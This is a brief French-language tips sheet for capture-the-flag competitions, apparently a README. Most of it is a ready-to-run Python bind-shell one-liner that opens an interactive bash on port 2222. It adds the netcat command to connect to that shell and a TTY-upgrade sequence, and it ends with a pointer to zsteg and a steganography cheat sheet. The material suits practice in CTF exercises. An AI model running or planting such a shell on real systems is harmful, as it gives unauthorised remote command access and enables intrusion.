Tips et tools utiles pour les CTFs

# Tips
## Unix 
Merci à @Clayno pour ses tips!

### Obtenir un shell
Pour ouvrir une connexion sur le port 2222:
```
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```
La connexion sur l'hôte se fait via 
```
nc -nv [adresse] 2222
```
Améliorer le shell en pty et avoir l'autocomplétion:
```
python -c "import pty; pty.spawn('/bin/bash')"
CTRL+Z
stty raw -echo
fg
```
## Steganographie
Tester zsteg

Cheat sheet : https://pequalsnp-team.github.io/cheatsheet/steganography-101
